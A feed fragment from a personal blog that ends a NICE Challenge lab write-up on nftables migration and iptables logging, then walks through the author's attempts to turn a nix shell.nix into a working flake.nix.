<p>And… no checks passed? It seems that enabling the nftables service resets the nftables rules.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/lib/systemd/system/nftables.service</strong></pre>
</div>
<div class="sourceCode" id="cb5" data-filename="/lib/systemd/system/nftables.service" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">[Unit]</span>
<span id="cb5-2">Description=nftables</span>
<span id="cb5-3">Documentation=man:nft(8) http://wiki.nftables.org</span>
<span id="cb5-4"></span>
<span id="cb5-5">[Service]</span>
<span id="cb5-6">Type=oneshot</span>
<span id="cb5-7">RemainAfterExit=yes</span>
<span id="cb5-8">StandardInput=null</span>
<span id="cb5-9">ProtectSystem=full</span>
<span id="cb5-10">ProtectHome=true</span>
<span id="cb5-11">ExecStart=/usr/sbin/nft -f /etc/nftables.conf</span>
<span id="cb5-12">ExecReload=/usr/sbin/nft -f /etc/nftables.conf</span>
<span id="cb5-13">ExecStop=/usr/sbin/nft flush ruleset</span>
<span id="cb5-14"></span>
<span id="cb5-15">[Install]</span>
<span id="cb5-16">WantedBy=multi-user.target</span></code></pre></div>
</div>
<p>The systemd nftables service seems to be a oneshot service that does nothing but flush the nftables rules. After disabling this service and using <code>iptables-compat-restore</code>, again, the “Fileshare filtering” check passes again.</p>
<p>After <code>apt remove iptables</code>, this removes <code>iptables</code>… and <code>iptables-nftables-compat</code>. But the “Fileshare remove iptables” check passes.</p>
</section>
<section id="firewall-logging" class="level2">
<h2 class="anchored" data-anchor-id="firewall-logging">Firewall Logging</h2>
<p>What needs to be logged:</p>
<ul>
<li>Log all SSH connection attempts with a prefix of “SSH DETECTED”</li>
</ul>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">iptables-compat -N SSH # Create new chain for SSH</span>
<span id="cb6-2"></span>
<span id="cb6-3">iptables-compat -D INPUT -j ACCEPT -p tcp --dport 22 # delete the existing ssh rule</span>
<span id="cb6-4"></span>
<span id="cb6-5">iptables-compat -A INPUT -j SSH -p tcp --dport 22 # Create new ssh rule that targets ssh chain instead</span>
<span id="cb6-6"></span>
<span id="cb6-7">iptables-compat -A SSH -m limit --limit 5/min -j LOG --log-prefix "SSH DETECTED " --log-level 4</span>
<span id="cb6-8"></span>
<span id="cb6-9">iptables-compat -A SSH -j ACCEPT</span></code></pre></div>
<p>This works, and logs are reported in syslog, and forwarded to the domain controller machine. It just does not pass the check.</p>
</section>
</section>
<section id="prod-joomia" class="level1">
<h1>Prod-Joomia</h1>
<section id="nftables-migration-1" class="level2">
<h2 class="anchored" data-anchor-id="nftables-migration-1">Nftables migration</h2>
<p>Follow steps for the machine “Fileshare”.</p>
</section>
<section id="firewall-logging-1" class="level2">
<h2 class="anchored" data-anchor-id="firewall-logging-1">Firewall logging</h2>
<p>Follow steps for “Fileshare” machine.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">iptables-compat -N DROPLOG</span>
<span id="cb7-2"></span>
<span id="cb7-3">iptables-compat -P INPUT ACCEPT # Accepts all input packets</span>
<span id="cb7-4"></span>
<span id="cb7-5">iptables-compat -A INPUT -j DROPLOG # if this is the last rule in the chain, then any packets that don't match previous rules are subject to this one instead.</span>
<span id="cb7-6"></span>
<span id="cb7-7">iptables-compats -A DROPLOG --m limit -limit 5/min -j LOG --log-prefix "PACKET DROPPED " --log-level 4</span>
<span id="cb7-8"></span>
<span id="cb7-9">iptables-compat -A DROPLOG -j DROP # If this is the last rule in the "DROPLOG" chain, then packets which don't match this rule will match this instead</span></code></pre></div>
</section>
</section>
<section id="domain-controller" class="level1">
<h1>Domain-Controller</h1>
<p>On the desktop, there is program to install “Syslog” watcher. Follow the prompts. Install both the service, and the manager. Make sure to select the option to open the firewall port as well.</p>
<p><img src="./writeups/nice-challenge-6/images/syslogssh.jpeg" class="img-fluid"></p>
<p>It seems to be detecting syslog connections with ssh, but I’m not getting the points. It does say “SSH DETECTED” logged from the Fileshare machine.</p>


</section>

 ]]></description>
  <category>writeups</category>
  <guid>./writeups/nice-challenge-6/</guid>
  <pubDate>Sun, 25 Aug 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Creating a nix flake shell, the “proper” way</title>
  <link>./playground/flake-shell/</link>
  <description><![CDATA[ 




<p>So, I think it’s time for me to move from the older channels way of doing things in nix, to the newer flakes. I am using the <a href="https://github.com/DeterminateSystems/nix-installer">determinate system nix installer</a>, which only comes with flakes. However, the nix docs are very poor, so I am going to document my process of converting my development environment here.</p>
<p>The first thing, is that despite the fact that there is a lot of the existing flakes use a utility called <a href="https://github.com/numtide/flake-utils">flake-utils</a>. However, this tool was ultimately started as an experiment, and has issues. A <a href="https://ayats.org/blog/no-flake-utils/">blog post</a> (<a href="https://web.archive.org/web/20240229094244/https://ayats.org/blog/no-flake-utils/">archive</a>) goes over some of the issues it has, and recommends against it… except I can’t figure out at all how to apply it.</p>
<p>The other recommendation is another pattern, recommended by Reddit user Tomberek:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb1-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb1-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"github:NixOS/nixpkgs/22.05"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb1-3">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>: <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb1-4">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">devShells</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">builtins</span>.mapAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb1-5">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb1-6">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">shellHook</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb1-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">          echo 'WARNING: gotcha during nix develop shellHooks'</span></span>
<span id="cb1-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">          function _direnv_hook(){</span></span>
<span id="cb1-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">              echo 'WARNING, "_direnv_hook" has been overwritten"'</span></span>
<span id="cb1-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">          }</span></span>
<span id="cb1-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        ''</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb1-12">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb1-13">          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>pkgs.writeShellApplication <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb1-14">            <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ls"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb1-15">            <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">text</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb1-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">              echo 'WARNING, "ls" has been overwritten"'</span></span>
<span id="cb1-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            ''</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb1-18">          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb1-19">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb1-20">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb1-21">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb1-22">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">})</span> nixpkgs.legacyPackages<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb1-23">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb1-24"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>There are multiple different ways of creating an output for multiple systems at once, it seems.</p>
<p>So far:</p>
<ul>
<li>ForEachSystem</li>
<li>Flake-parts</li>
<li>Flake-utils</li>
<li>Tomberek’s method</li>
</ul>
<p>I suspect there are other methods, potentially better one’s, that aren’t documented. However, because of the <a href="https://ayats.org/blog/no-flake-utils/">no-flake-utils</a> blogpost, where the author suggests to use pure nix and no libraries, I have decided to opt for that approach.</p>
<p>My ultimate goal is to convert the shell.nix I am using, into a flake.</p>
<p>I have a simple outline:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>flake.nix</strong></pre>
</div>
<div class="sourceCode" id="cb2" data-filename="flake.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb2-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-3">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"nixpkgs"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb2-4">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb2-5">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> inputs @ <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...}</span>: <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb2-6"></span>
<span id="cb2-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="cb2-8"></span>
<span id="cb2-9">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">forAllSystems</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">function</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-10">      nixpkgs.lib.genAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb2-11">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x86_64-linux"</span></span>
<span id="cb2-12">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"aarch64-linux"</span></span>
<span id="cb2-13">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-14">        function <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-15">          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> system<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb2-16">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">allowUnfree</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="cn" style="color: #8f5902;
background-color: null;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb2-17">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">overlays</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb2-18">            inputs.something.overlays.default</span>
<span id="cb2-19">          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb2-20">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb2-21"></span>
<span id="cb2-22">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-23">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">devShells</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">x86_64-linux</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-24">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> </span>
<span id="cb2-25">            nodePackages_latest.npm</span>
<span id="cb2-26">            quarto</span>
<span id="cb2-27">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb2-28">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb2-29">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb2-30"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
<p>After some tinkering, I get this to at least load, and not give me a syntax error. Instead, it gives me a different error:</p>
<p><code>error: flake 'git+file:///home/moonpie/vscode/test/flake-test' does not provide attribute 'packages.x86_64-linux.default' or 'defaultPackage.x86_64-linux'</code></p>
<p>I find this odd, since I provide a devshell. However, I realized that the other command to get a reproducible shell environment, <code>nix develop</code>, might be what is used instead to call upon the <code>devShells</code> attribute.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@lizard flake-test]$ nix develop</span>
<span id="cb3-2">error:</span>
<span id="cb3-3">       … while evaluating a branch condition</span>
<span id="cb3-4">         at /nix/store/2yb39wmx10a5lsm4d2jj7c6h94h36spi-source/pkgs/stdenv/booter.nix:64:9:</span>
<span id="cb3-5">           63|       go = pred: n:</span>
<span id="cb3-6">           64|         if n == len</span>
<span id="cb3-7">             |         ^</span>
<span id="cb3-8">           65|         then rnul pred</span>
<span id="cb3-9"></span>
<span id="cb3-10">       … while calling the 'length' builtin</span>
<span id="cb3-11">         at /nix/store/2yb39wmx10a5lsm4d2jj7c6h94h36spi-source/pkgs/stdenv/booter.nix:62:13:</span>
<span id="cb3-12">           61|     let</span>
<span id="cb3-13">           62|       len = builtins.length list;</span>
<span id="cb3-14">             |             ^</span>
<span id="cb3-15">           63|       go = pred: n:</span>
<span id="cb3-16"></span>
<span id="cb3-17">       (stack trace truncated; use '--show-trace' to show the full trace)</span>
<span id="cb3-18"></span>
<span id="cb3-19">       error: attribute 'currentSystem' missing</span>
<span id="cb3-20">       at /nix/store/2yb39wmx10a5lsm4d2jj7c6h94h36spi-source/pkgs/top-level/impure.nix:17:43:</span>
<span id="cb3-21">           16|   # (build, in GNU Autotools parlance) platform.</span>
<span id="cb3-22">           17|   localSystem ? { system = args.system or builtins.currentSystem; }</span>
<span id="cb3-23">             |                                           ^</span>
<span id="cb3-24">           18|</span></code></pre></div>
<p>What’s the difference between nix shell and nix develop? From my understanding, <code>nix develop</code> is designed for developing packages, as it brings in build dependencies, rather than only runtime dependencies. It’s because of this, that I want <code>nix shell</code> to work instead, because that command seems to be focused more on simply getting the tools I want.</p>
<p>Except, according to some comparisons I found online, <a href="https://discourse.nixos.org/t/difference-between-nix-shell-nix-shell-nix-develop/32469/4">nix shell can’t even adjust environment variables</a>. Now of course, a single forum reply is <em>not</em> documentation… but nix’s documentation is very poor, and this is a common frustration, being forced to rely on forum posts rather than official documentation for information.</p>
<p>The <a href="https://nix.dev/manual/nix/2.18/command-ref/new-cli/nix3-shell">official docs</a> talk about using <code>nix shell</code> as a command line program, but not at all how it interacts with flakes and .nix files.</p>
<p>I got something that works for <code>nix develop</code></p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>flake.nix</strong></pre>
</div>
<div class="sourceCode" id="cb4" data-filename="flake.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb4-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-3">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"nixpkgs"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb4-4">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb4-5">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> inputs @ <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...}</span>: <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb4-6"></span>
<span id="cb4-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="cb4-8"></span>
<span id="cb4-9">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">forAllSystems</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">function</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb4-10">      nixpkgs.lib.genAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb4-11">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x86_64-linux"</span></span>
<span id="cb4-12">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"aarch64-linux"</span></span>
<span id="cb4-13">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb4-14">        function <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-15">          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> system<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb4-16">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">allowUnfree</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="cn" style="color: #8f5902;
background-color: null;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb4-17">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb4-18"></span>
<span id="cb4-19">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-20"></span>
<span id="cb4-21">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">devShells</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-22">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-23">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> </span>
<span id="cb4-24">            nodePackages_latest.npm</span>
<span id="cb4-25">            quarto</span>
<span id="cb4-26">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb4-27">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb4-28">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">});</span></span>
<span id="cb4-29">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-30">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb4-31">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb4-32">            nodePackages_latest.npm</span>
<span id="cb4-33">            quarto</span>
<span id="cb4-34">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb4-35">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb4-36">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">});</span></span>
<span id="cb4-37">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb4-38"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
<p><code>nix develop</code> works fine, except it takes a long time to setup on the first run, compared to <code>nix-shell -p quarto nodePackages_latest.npm</code>. I wonder if this is because, since <code>nix develop</code> is designed for development purposes, it pulls in more dependencies than <code>nix-shell</code> does.</p>
<p><code>nix shell</code> doesn’t work at all. It gives me a different shell, and adds things to the path, but it doesn’t actually add any of the programs I specify to the path.</p>
<p>(Also, I still have another unanswered question: What does the <code>@</code> symbol mean in a nix expression).</p>
<p>I later went and <a href="https://nix.dev/tutorials/nix-language.html#named-attribute-set-argument">found an answer</a>. <code>@</code> <em>names</em> the attribute set</p>
<p>I managed to get <code>nix shell</code> working… somewhat.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>flake.nix</strong></pre>
</div>
<div class="sourceCode" id="cb5" data-filename="flake.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb5-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb5-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb5-3">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"nixpkgs"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb5-4">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb5-5">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
